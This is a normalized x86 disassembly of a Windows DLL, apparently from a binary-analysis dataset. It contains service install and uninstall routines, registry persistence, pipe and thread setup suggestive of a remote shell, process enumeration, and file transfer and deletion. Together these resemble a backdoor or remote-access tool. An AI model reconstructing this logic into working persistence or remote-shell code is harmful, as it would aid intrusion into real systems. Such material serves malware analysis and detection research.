je r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ ebp + 0xcf4 ]
lea eax [ esp + 0x1c ]
push 0x0
push eax
mov eax [ ebp + 0x4 ]
push ecx
push edx
push eax
call [ WriteFile@IAT ]
test eax eax
mov [ esp + 0x10 ] eax
je r-xdata
mov edx [ ebp + 0xef8 ]
push rw-data
push edx
call sub_10009100
add esp 0x8
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
mov edi [ CreatePipe@IAT ]
mov [ esp + 0x34 ] eax
push eax
lea edx [ esp + 0x34 ]
lea eax [ ebp + 0x10 ]
lea esi [ ebp + 0xc ]
push edx
push eax
push esi
mov [ ebp + 0xe50 ] 0x3
mov [ esp + 0x40 ] 0xc
mov [ esp + 0x48 ] 0x1
call edi
lea ecx [ esp + 0x30 ]
push 0x0
lea edx [ ebp + 0x18 ]
push ecx
add ebp 0x14
push edx
push ebp
call edi
push 0x0
push 0x0
push esi
push r-xdata
push 0x0
push 0x0
call [ CreateThread@IAT ]
push eax
call [ CloseHandle@IAT ]
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x234
retn 0x4
pop edi
pop esi
pop ebp
mov [ esp + 0x4 ] eax
pop ebx
add esp 0x234
retn 0x4
mov [ rw-data ] 0x5
push eax
call sub_1000a6ca
add esp 0x4
mov [ rw-data ] eax
jmp r-xdata
mov ecx [ esp + 0x14 ]
mov eax [ ebp + 0x8 ]
sub eax ecx
mov [ ebp + 0x8 ] eax
jne r-xdata
push eax
push 0x80
push 0x3
push eax
push eax
mov eax [ ebp + 0xefc ]
push 0x80000000
push eax
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
mov [ ebp + 0x4 ] eax
jne r-xdata
mov ecx [ ebp + 0xefc ]
push eax
push 0x80
push 0x2
push eax
push eax
push 0x40000000
push ecx
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
mov [ ebp + 0x4 ] eax
jne r-xdata
mov edx [ rw-data ]
mov [ rw-data ] 0x1
mov ecx [ ebp + 0xcf4 ]
mov [ esp + 0x14 ] 0x7
mov [ ecx ] edx
mov ax [ rw-data ]
mov [ ecx + 0x4 ] ax
mov dl [ rw-data ]
mov [ ecx + 0x6 ] dl
mov edx [ ebp + 0x4 ]
mov [ esp + 0x10 ] 0x0
push edx
call [ CloseHandle@IAT ]
mov eax [ esp + 0x10 ]
pop edi
mov [ ebp + 0x4 ] 0xffffffff
pop esi
pop ebp
pop ebx
add esp 0x234
retn 0x4
push 0x0
push eax
mov [ ebp + 0xe50 ] 0x4
call [ GetFileSize@IAT ]
mov ecx [ ebp + 0xcf4 ]
push eax
add ecx 0x800
push rw-data
push ecx
mov [ ebp + 0x8 ] eax
call sub_1000a135
mov eax [ ebp + 0xcf4 ]
add esp 0xc
lea edx [ eax + 0x800 ]
push edx
push rw-data
push eax
call sub_1000a135
mov edx [ ebp + 0xf78 ]
or ecx 0xffffffff
add esp 0xc
lea eax [ edx + 0x1 ]
mov [ ebp + 0xf78 ] eax
mov ebp [ ebp + 0xcf4 ]
mov edi ebp
xor eax eax
[ edi ]
not ecx
dec ecx
push ebp
push ecx
push edx
push rw-data
push ebx
call sub_100088c0
mov eax [ esp + 0x24 ]
add esp 0x14
pop edi
pop esi
pop ebp
pop ebx
add esp 0x234
retn 0x4
pop edi
mov [ esp + 0xc ] 0x0
mov eax [ esp + 0xc ]
pop esi
pop ebp
pop ebx
add esp 0x234
retn 0x4
mov edx [ ebp + 0xf00 ]
push edx
call sub_1000a63f
add esp 0x4
mov [ ebp + 0x8 ] eax
mov eax [ ebp + 0xcf4 ]
mov [ ebp + 0xe50 ] 0x5
push rw-data
push rw-data
push eax
call sub_1000a135
mov edx [ ebp + 0xf78 ]
xor eax eax
add esp 0xc
lea ecx [ edx + 0x1 ]
mov [ ebp + 0xf78 ] ecx
mov ebp [ ebp + 0xcf4 ]
mov edi ebp
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push ebp
push ecx
push edx
push rw-data
push ebx
call sub_100088c0
mov eax [ esp + 0x24 ]
add esp 0x14
pop edi
pop esi
pop ebp
pop ebx
add esp 0x234
retn 0x4
pop edi
mov [ esp + 0xc ] 0x0
mov eax [ esp + 0xc ]
pop esi
pop ebp
pop ebx
add esp 0x234
retn 0x4
sub_10006c10
mov eax 0x210c
call sub_1000a610
push ebx
push ebp
push esi
mov ebp ecx
push edi
mov ecx 0x1f
mov esi rw-data
lea edi [ esp + 0x9c ]
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
lea eax [ ebp + 0x30 ]
mov ecx 0x1e
mov esi rw-data
lea edi [ esp + 0x24 ]
push eax
mov eax [ esp + 0x2124 ]
[ edi ] [ esi ]
push eax
lea ecx [ esp + 0x124 ]
xor ebx ebx
push rw-data
push ecx
mov [ esp + 0x2c ] ebp
mov [ esp + 0x28 ] ebx
call sub_1000a135
lea edi [ esp + 0x12c ]
or ecx 0xffffffff
xor eax eax
add esp 0x10
[ edi ]
not ecx
dec ecx
lea edx [ esp + 0x11c ]
mov [ esp + 0x10 ] ecx
lea eax [ esp + 0x18 ]
push edx
lea ecx [ esp + 0xa0 ]
push eax
lea edx [ esp + 0x18 ]
push ecx
push edx
push rw-data
mov ecx ebp
call sub_100056d0
mov ecx [ esp + 0x10 ]
mov [ eax + ecx ] bl
mov edx [ esp + 0x10 ]
push edx
push eax
call sub_10002860
add esp 0x8
mov esi eax
mov [ esp + 0x20 ] esi
push 0xffffffff
push rw-data
push ebx
push rw-data
push ebx
push rw-data
push ebx
push rw-data
push esi
call sub_100016f0
add esp 0x24
mov [ esp + 0x14 ] eax
test eax eax
je r-xdata
push esi
call sub_100031a0
mov ecx [ esp + 0x2124 ]
add esp 0x4
lea eax [ ebp + 0x30 ]
lea edx [ esp + 0x11c ]
push eax
push ecx
push rw-data
push edx
call sub_1000a135
lea edi [ esp + 0x12c ]
or ecx 0xffffffff
xor eax eax
add esp 0x10
[ edi ]
not ecx
dec ecx
lea eax [ esp + 0x11c ]
mov [ esp + 0x10 ] ecx
lea ecx [ esp + 0x18 ]
push eax
lea edx [ esp + 0x28 ]
push ecx
lea eax [ esp + 0x18 ]
push edx
push eax
push rw-data
mov ecx ebp
call sub_100056d0
mov ecx [ esp + 0x10 ]
mov [ eax + ecx ] 0x0
mov edx [ esp + 0x10 ]
push edx
push eax
call sub_10002860
add esp 0x8
mov ebp eax
push 0xffffffff
push rw-data
push 0x0
push rw-data
push 0x0
push rw-data
push 0x0
push rw-data
push 0x0
push rw-data
push ebp
call sub_100016f0
mov esi eax
add esp 0x2c
test esi esi
je r-xdata
mov eax [ esp + 0x14 ]
push 0xffffffff
push rw-data
push 0x0
push rw-data
push 0x0
push rw-data
push eax
call sub_100016f0
mov ebp eax
add esp 0x1c
test ebp ebp
je r-xdata
push ebp
call sub_100031a0
mov eax [ esp + 0x1c ]
add esp 0x4
test eax eax
pop edi
pop esi
pop ebp
pop ebx
je r-xdata
push 0xffffffff
push rw-data
push 0x0
push rw-data
push esi
call sub_100016f0
add esp 0x14
mov edi eax
push 0xffffffff
push rw-data
push 0x0
push rw-data
push esi
call sub_100016f0
add esp 0x14
mov ebx eax
push 0xffffffff
push rw-data
push 0x0
push rw-data
push 0x0
push rw-data
push 0x0
push rw-data
push esi
call sub_100016f0
add esp 0x24
test edi edi
je r-xdata
mov eax [ esp + 0x14 ]
mov eax [ eax + 0x10 ]
test eax eax
mov [ esp + 0x14 ] eax
jne r-xdata
push 0xffffffff
push rw-data
push ebp
call sub_100016f0
add esp 0xc
test eax eax
je r-xdata
mov eax 0x1
add esp 0x210c
retn 0x4
push eax
call sub_1000901e
add esp 0x4
mov esi [ esi + 0x10 ]
test esi esi
jne r-xdata
mov edi [ edi + 0x8 ]
test ebx ebx
je r-xdata
mov ebp [ esp + 0x1c ]
mov esi [ esp + 0x20 ]
push 0xffffffff
push rw-data
push 0x0
push rw-data
push ebp
call sub_100016f0
mov esi eax
add esp 0x14
test esi esi
je r-xdata
mov edi [ eax + 0x8 ]
mov esi rw-data
mov eax edi
mov ebx rw-data
mov ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebp [ ebp + 0x10 ]
test ebp ebp
jne r-xdata
push 0xffffffff
push rw-data
push esi
call sub_100016f0
add esp 0xc
test eax eax
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov eax rw-data
mov eax [ eax + 0x8 ]
jmp r-xdata
test eax eax
je r-xdata
mov esi [ esi + 0x10 ]
test esi esi
jne r-xdata
mov eax [ eax + 0x8 ]
push ebx
push 0x0
push 0x0
push eax
call sub_10001090
add esp 0x10
mov esi rw-data
mov eax edi
mov ebx 0x2
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
push 0x4
push eax
push ebx
push edi
call sub_10001090
add esp 0x10
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov esi rw-data
mov eax edi
mov ebx 0x8
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sub_10006fc0
sub esp 0x134
push ebx
mov ebx [ esp + 0x13c ]
push ebp
push esi
push edi
mov edi ebx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0xc4 ]
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0xc4 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea eax [ esp + 0x2c ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea edi [ esp + 0xc8 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
lea ecx [ esp + 0xcc ]
push ecx
call sub_10004200
mov edx [ esp + 0x38 ]
mov eax [ esp + 0x3c ]
mov ecx [ esp + 0x40 ]
mov [ esp + 0x28 ] edx
mov edx [ esp + 0x44 ]
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] ecx
add esp 0xc
mov [ esp + 0x28 ] edx
lea eax [ esp + 0x2c ]
mov ecx 0x4
mov edi [ eax ]
add eax 0x4
and edi 0x7fffffff
dec ecx
mov [ eax - 0x4 ] edi
jne r-xdata
push rw-data
push ebx
lea eax [ esp + 0x4c ]
push rw-data
push eax
call sub_1000a135
mov edi ebx
or ecx 0xffffffff
xor eax eax
add esp 0x10
[ edi ]
not ecx
dec ecx
mov edi rw-data
mov edx ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x44 ]
xor ebx ebx
xor ebp ebp
lea eax [ edx + ecx + 0x7 ]
or ecx 0xffffffff
and eax 0xf8
mov [ esp + 0x14 ] ebx
mov [ esp + 0x18 ] ebx
mov [ esp + 0x3c ] ebx
mov [ esp + eax + 0x44 ] 0x0
xor eax eax
[ edi ]
not ecx
dec ecx
test ecx 0xfffffffc
jbe r-xdata
mov eax [ esp + 0x30 ]
xor edx edx
add eax ebx
push 0x0
adc edx ebp
push 0x7fffffff
push edx
push eax
call sub_1000a700
mov ebp [ esp + 0x18 ]
mov esi eax
mov eax [ esp + 0x38 ]
mov [ esp + 0x40 ] edx
mov edx [ esp + 0x14 ]
xor ecx ecx
add eax edx
push 0x0
adc ecx ebp
push 0x7fffffff
push ecx
push eax
call sub_1000a700
mov ebx [ esp + 0x1c ]
mov edi [ esp + 0x20 ]
mov ecx [ esp + 0x28 ]
mov [ esp + 0x18 ] edx
mov edx [ esp + 0x24 ]
xor ebx esi
xor edx esi
xor edi eax
mov [ esp + 0x24 ] edx
lea edx [ esp + 0x1c ]
xor ecx eax
push 0x10
push edx
mov [ esp + 0x24 ] ebx
mov [ esp + 0x28 ] edi
mov [ esp + 0x30 ] ecx
call sub_10004c60
mov edx eax
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
sub edi ecx
push edx
mov eax ecx
mov esi edi
mov edi [ esp + 0x158 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
call sub_10009e3d
add esp 0xc
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x134
retn 0x8
lea ecx [ esp + 0x44 ]
mov [ esp + 0x10 ] ecx
mov edx [ esp + 0x10 ]
push 0x0
push 0xe79a9c1
mov eax [ edx ]
cdq
push edx
push eax
call sub_1000a7c0
push 0x0
push 0x7fffffff
push edx
push eax
call sub_1000a700
mov ecx eax
add ecx ebx
adc edx ebp
xor eax eax
push eax
mov eax [ esp + 0x30 ]
push eax
push edx
push ecx
call sub_1000a7c0
mov ebp [ esp + 0x30 ]
mov ecx eax
add ecx ebp
mov eax 0x0
adc edx eax
push eax
push 0x7fffffff
push edx
push ecx
call sub_1000a700
mov edi edx
mov edx [ esp + 0x10 ]
mov esi eax
push 0x0
mov eax [ edx + 0x4 ]
push 0x7fffffff
cdq
add eax esi
adc edx edi
push edx
push eax
call sub_1000a700
xor ecx ecx
push ecx
mov ecx [ esp + 0x38 ]
push ecx
push edx
push eax
call sub_1000a7c0
mov ebp [ esp + 0x38 ]
mov ecx eax
add ecx ebp
mov eax 0x0
adc edx eax
push eax
push 0x7fffffff
push edx
push ecx
call sub_1000a700
mov ecx [ esp + 0x14 ]
mov ebx eax
mov eax [ esp + 0x18 ]
mov ebp edx
add esi ebx
mov edx [ esp + 0x3c ]
adc edi ebp
add ecx esi
mov [ esp + 0x14 ] ecx
mov ecx [ esp + 0x10 ]
adc eax edi
add ecx 0x8
add edx 0x2
mov [ esp + 0x10 ] ecx
mov [ esp + 0x18 ] eax
or ecx 0xffffffff
mov [ esp + 0x3c ] edx
lea edi [ esp + 0x44 ]
xor eax eax
[ edi ]
not ecx
dec ecx
shr ecx 0x2
cmp edx ecx
jb r-xdata
sub_100072a0
mov eax [ esp + 0x4 ]
cmp eax 0x1
mov [ ecx + 0xe50 ] eax
je r-xdata
push 0x1
add ecx 0xcf8
call sub_10008900
retn 0x4
test eax eax
je r-xdata
push 0x0
add ecx 0xcf8
call sub_10008900
retn 0x4
sub_100072e0
mov eax [ esp + 0x4 ]
push edi
test eax eax
je r-xdata
xor eax eax
pop edi
retn 0x8
mov edi [ esp + 0xc ]
test di di
je r-xdata
push esi
lea esi [ ecx + 0xcf8 ]
push eax
mov ecx esi
call sub_100085b0
push edi
mov ecx esi
call sub_10008630
pop esi
mov eax 0x1
pop edi
retn 0x8
sub_10007340
sub esp 0x128
push ebx
push esi
push edi
push 0x0
push 0x2
call CreateToolhelp32Snapshot
mov edi eax
lea eax [ esp + 0xc ]
push eax
push edi
mov [ esp + 0x14 ] 0x128
call Process32First
test eax eax
je r-xdata
push edi
call [ CloseHandle@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x128
retn
push 0x8
call sub_100096ed
lea ecx [ esp + 0x34 ]
add esp 0x4
mov [ eax ] ecx
mov edx [ esp + 0x14 ]
mov [ eax + 0x4 ] edx
mov esi rw-data
lea eax [ esp + 0x30 ]
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
push edi
call [ CloseHandle@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x128
retn
lea eax [ esp + 0xc ]
push eax
push edi
call Process32Next
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
sub_10007916
inc [ ebx - 0x3fcc0037 ]
[ edi ]
not ecx
add ecx 0xffffffff
mov edx ecx
lea edi [ ebp - 0x21c ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
cmp edx ecx
je r-xdata
xor eax eax
jmp sub_10007965
lea eax [ ebp - 0x470 ]
push eax
call [ DeleteFileA@IAT ]
ServiceMain
sub esp 0x100
lea ecx [ esp ]
push esi
mov esi [ esp + 0x10c ]
push edi
push 0x100
mov eax [ esi ]
push eax
push ecx
call sub_100092c0
mov edx [ esi ]
push 0x100
lea eax [ esp + 0x18 ]
push edx
push eax
call sub_1000ab66
mov edi [ esp + 0x124 ]
add esp 0x18
lea ecx [ esp + 0x8 ]
push ecx
push edi
push rw-data
call sub_100081f0
add esp 0xc
lea edx [ esp + 0x8 ]
push sub_10007b50
push edx
call [ RegisterServiceCtrlHandlerA@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
push 0x1
push 0x0
push 0x2
call sub_10007af0
push 0x0
push 0x0
push 0x4
call sub_10007af0
add esp 0x18
cmp edi 0x1
jle r-xdata
mov eax [ esi ]
push eax
push rw-data
call sub_100081f0
add esp 0x8
pop edi
pop esi
add esp 0x100
retn 0x8
mov eax rw-data
mov ecx [ esi + 0x4 ]
push 0x100
lea edx [ esp + 0xc ]
push ecx
push edx
call sub_100092c0
mov eax [ esi + 0x4 ]
push 0x100
lea ecx [ esp + 0x18 ]
push eax
push ecx
call sub_1000ab66
add esp 0x18
lea eax [ esp + 0x8 ]
jmp r-xdata
push rw-data
call sub_100081f0
add esp 0x4
pop edi
pop esi
add esp 0x100
retn 0x8
cmp eax 0x1
jne r-xdata
xor edx edx
cmp edi 0x2
setg dl
push edx
push eax
call sub_10007c40
mov esi [ Sleep@IAT ]
add esp 0x8
push 0xa
call esi
mov eax [ rw-data ]
cmp eax 0x3
je r-xdata
sub_10007af0
sub esp 0x1c
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x28 ]
mov [ rw-data ] eax
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x24 ]
lea edx [ esp ]
mov [ esp + 0xc ] eax
mov eax [ rw-data ]
push edx
push eax
mov [ esp + 0x8 ] 0x10
mov [ esp + 0x10 ] 0x7
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x1c ] ecx
mov [ esp + 0x20 ] 0xbb8
call [ SetServiceStatus@IAT ]
add esp 0x1c
retn
sub_10007b50
mov eax [ esp + 0x4 ]
dec eax
cmp eax 0x4
ja r-xdata
retn 0x4
jmp [ eax * 4 + jump_table_10007c28 ]
push 0x1
push 0x0
push 0x3
call sub_10007af0
add esp 0xc
push rw-data
call sub_100081f0
add esp 0x4
push 0xa
call [ Sleep@IAT ]
push 0x0
push 0x0
push 0x1
call sub_10007af0
add esp 0xc
retn 0x4
push 0x1
push 0x0
push 0x6
call sub_10007af0
add esp 0xc
push rw-data
call sub_100081f0
push 0x0
push 0x0
push 0x7
call sub_10007af0
add esp 0x10
retn 0x4
push 0x1
push 0x0
push 0x5
call sub_10007af0
add esp 0xc
push rw-data
call sub_100081f0
push 0x0
push 0x0
push 0x4
call sub_10007af0
add esp 0x10
retn 0x4
push rw-data
call sub_100081f0
mov ecx [ rw-data ]
push 0x0
push 0x0
push ecx
call sub_10007af0
add esp 0x10
retn 0x4
push rw-data
call sub_100081f0
push 0x0
push 0x0
push 0x1
call sub_10007af0
add esp 0x10
sub_10007c50
push ecx
push ebx
push esi
push edi
push 0xf003f
push 0x0
push 0x0
call [ OpenSCManagerA@IAT ]
mov esi eax
push esi
call [ LockServiceDatabase@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ esp + 0x14 ]
push 0x2
push eax
push esi
call [ OpenServiceA@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebx
pop ecx
retn
mov ecx [ rw-data ]
lea edx [ esp + 0xc ]
push edx
push 0x1
push edi
mov [ esp + 0x18 ] ecx
call [ ChangeServiceConfig2A@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebx
pop ecx
retn
push ebx
call [ UnlockServiceDatabase@IAT ]
push edi
mov edi [ CloseServiceHandle@IAT ]
call edi
push esi
call edi
pop edi
pop esi
xor eax eax
pop ebx
pop ecx
retn
pop edi
pop esi
or eax 0xffffffff
pop ebx
pop ecx
retn
ServiceInstall
push ebp
mov ebp esp
push 0xffffffff
push sub_10011860
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x23c
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
xor ebx ebx
mov edi rw-data
cmp eax ebx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x14 ] 0x80000002
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x14 ]
push eax
push 0x1
push ebx
push rw-data
push ecx
call [ RegOpenKeyExA@IAT ]
cmp eax ebx
mov [ ebp + 0x8 ] eax
je r-xdata
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0x44 ]
lea ecx [ ebp - 0x248 ]
push eax
mov eax [ ebp - 0x14 ]
lea edx [ ebp - 0x50 ]
push ecx
push edx
push ebx
push rw-data
push eax
mov [ ebp - 0x44 ] 0x1f4
call [ RegQueryValueExA@IAT ]
mov ecx [ ebp - 0x14 ]
mov esi eax
push ecx
mov [ ebp + 0x8 ] esi
call [ RegCloseKey@IAT ]
push esi
call [ SetLastError@IAT ]
cmp esi ebx
je r-xdata
push eax
push rw-data
push rw-data
call sub_100081f0
add esp 0xc
lea edx [ ebp - 0x4c ]
mov [ ebp - 0x4c ] rw-data
push r--data
push edx
call sub_1000af13
mov [ ebp - 0x18 ] eax
mov edi eax
lea esi [ ebp - 0x248 ]
lea edx [ ebp - 0x34 ]
push r--data
push edx
mov [ ebp - 0x34 ] rw-data
call sub_1000af13
push rw-data
call sub_100081f0
add esp 0x4
lea eax [ ebp - 0x28 ]
mov [ ebp - 0x28 ] rw-data
push r--data
push eax
call sub_1000af13
push edi
push esi
call sub_10009100
add esp 0x8
test eax eax
je r-xdata
push 0x0
mov edx [ rw-data ]
push 0x0
push 0x0
push 0x0
push 0x0
push rw-data
push 0x1
push 0x2
push 0x110
push 0xf01ff
push edx
push edi
push ebx
call [ CreateServiceA@IAT ]
mov esi eax
test esi esi
mov [ ebp - 0x24 ] esi
jne r-xdata
lea ecx [ ebp - 0x3c ]
push r--data
push ecx
mov [ ebp - 0x3c ] rw-data
call sub_1000af13
cmp [ esi ] 0x0
jne r-xdata
push ebx
push esi
call sub_10009040
add esp 0x8
inc eax
mov esi eax
jmp r-xdata
push edi
push rw-data
call sub_100081f0
add esp 0x8
push esi
mov esi [ CloseServiceHandle@IAT ]
call esi
push ebx
call esi
push 0x1f4
lea ecx [ ebp - 0x248 ]
push rw-data
push ecx
mov [ ebp - 0x14 ] 0x80000002
call sub_100092c0
push 0x64
lea edx [ ebp - 0x248 ]
push edi
push edx
call sub_1000adf0
mov edx [ ebp - 0x14 ]
add esp 0x18
lea eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x248 ]
push eax
push 0xf003f
push 0x0
push ecx
push edx
call [ RegOpenKeyExA@IAT ]
test eax eax
mov [ ebp + 0x8 ] eax
je r-xdata
call [ GetLastError@IAT ]
push eax
push edi
push rw-data
mov [ ebp + 0x8 ] eax
call sub_100081f0
add esp 0xc
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x48 ] rw-data
push r--data
push eax
call sub_1000af13
push 0xf003f
push ebx
push ebx
call [ OpenSCManagerA@IAT ]
mov ebx eax
test ebx ebx
mov [ ebp - 0x20 ] ebx
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
mov edx [ ebp - 0x14 ]
lea ecx [ ebp - 0x1c ]
push ecx
push rw-data
push edx
call [ RegCreateKeyA@IAT ]
mov edi eax
push edi
mov [ ebp + 0x8 ] edi
call [ SetLastError@IAT ]
test edi edi
je r-xdata
push eax
push edi
push rw-data
call sub_100081f0
add esp 0xc
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x2c ] rw-data
push r--data
push eax
call sub_1000af13
mov edx [ rw-data ]
lea ecx [ ebp - 0x248 ]
push 0x1f4
push ecx
push edx
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x30 ]
push r--data
push eax
mov [ ebp - 0x30 ] rw-data
call sub_1000af13
lea edi [ ebp - 0x248 ]
or ecx 0xffffffff
xor eax eax
mov edx [ ebp - 0x1c ]
[ edi ]
not ecx
push ecx
lea ecx [ ebp - 0x248 ]
push ecx
push 0x2
push eax
push rw-data
push edx
call [ RegSetValueExA@IAT ]
mov edi eax
push edi
mov [ ebp + 0x8 ] edi
call [ SetLastError@IAT ]
test edi edi
je r-xdata
lea eax [ ebp - 0x38 ]
push r--data
push eax
mov [ ebp - 0x38 ] rw-data
call sub_1000af13
mov ecx [ ebp - 0x18 ]
push ecx
push rw-data
call sub_100081f0
add esp 0x8
jmp r-xdata
lea eax [ ebp - 0x40 ]
push r--data
push eax
mov [ ebp - 0x40 ] rw-data
call sub_1000af13
mov edx [ ebp - 0x14 ]
push edx
call [ RegCloseKey@IAT ]
mov eax [ ebp - 0x1c ]
push eax
call [ RegCloseKey@IAT ]
mov ecx [ ebp - 0x24 ]
push ecx
call esi
push ebx
call esi
mov edx [ ebp - 0x18 ]
push edx
call sub_10007c50
mov ecx [ ebp - 0xc ]
add esp 0x4
mov eax edi
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10008003
mov esi [ ebp - 0x54 ]
test esi esi
je r-xdata
mov eax r-xdata
retn
cmp [ esi ] 0x0
je r-xdata
call [ GetLastError@IAT ]
push eax
push esi
push rw-data
mov [ ebp + 0x8 ] eax
call sub_100081f0
add esp 0xc
UnServiceInstall
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor esi esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] esi
push 0xf003f
push esi
push esi
call [ OpenSCManagerA@IAT ]
mov ebx eax
mov [ ebp - 0x24 ] ebx
cmp ebx esi
jne r-xdata
mov edi rw-data
mov [ ebp - 0x28 ] edi
mov eax [ ebp + 0x8 ]
cmp eax esi
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
mov [ ebp - 0x1c ] esi
push esi
push rw-data
call sub_100081f0
add esp 0x8
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x10000
push edi
push ebx
call [ OpenServiceA@IAT ]
mov esi eax
mov [ ebp - 0x20 ] esi
test esi esi
je r-xdata
cmp [ eax ] 0x0
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
mov [ ebp - 0x1c ] esi
push esi
push edi
push rw-data
call sub_100081f0
add esp 0xc
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
call [ DeleteService@IAT ]
test eax eax
jne r-xdata
mov edi eax
mov [ ebp - 0x28 ] edi
push edi
push rw-data
call sub_100081f0
add esp 0x8
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push esi
mov esi [ CloseServiceHandle@IAT ]
call esi
push ebx
call esi
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10008280
push esi
mov esi ecx
mov eax [ esi + 0x14c ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov esi [ esi + 0x144 ]
test esi esi
je r-xdata
push eax
call sub_1000901e
add esp 0x4
pop esi
retn
push esi
call sub_1000901e
add esp 0x4
sub_100082c0
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
push edi
call [ lstrlenA@IAT ]
push eax
push edi
mov ecx esi
call sub_10008940
pop edi
pop esi
retn 0x4
sub_100082e0
push ecx
push ebx
push ebp
mov ebp [ esp + 0x18 ]
mov ebx ecx
push esi
push edi
mov [ ebp ] 0x0
mov eax [ ebx + 0x154 ]
test eax eax
mov [ esp + 0x10 ] 0x1
je r-xdata
mov eax [ ebx + 0x150 ]
cmp eax 0xffffffff
jne r-xdata
mov eax [ ebx + 0x12c ]
test eax eax
je r-xdata
mov esi [ esp + 0x1c ]
mov edi [ esp + 0x18 ]
push 0x0
push esi
push edi
push eax
call [ rw-data ]
cmp eax 0xffffffff
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
